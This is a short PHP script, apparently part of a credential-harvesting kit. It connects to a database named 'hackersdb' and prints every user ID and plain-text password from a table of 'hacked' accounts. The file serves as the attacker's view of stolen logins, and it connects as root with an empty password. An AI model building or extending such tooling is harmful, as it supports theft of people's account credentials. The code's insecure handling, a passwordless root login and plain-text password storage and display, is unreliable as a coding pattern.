<?php
//declaration
$hostname="localhost";
$user="root";
$pass="";
$dbname="hackersdb";


//create connection

$conn=mysqli_connect($hostname,$user,$pass,$dbname);
if(!$conn)
{
	die("CONNECTION FAIL" . mysqli_connect_error());
}
echo "*";
//display data

$sql3 = "select * from hackedidpass";
$result = $conn->query($sql3);

if ($result->num_rows > 0) 
{
    // output data of each row
	echo "LIST OF HACKED USERS:";
	while($row = $result->fetch_assoc()) 
	{
        		echo "<br>USERID: " . $row["userid"]; 
		echo "<br>PASSWORD: " . $row["pass"]; 
		
	}
} 
else 
{
    echo "0 results";
}
$conn->close();
?>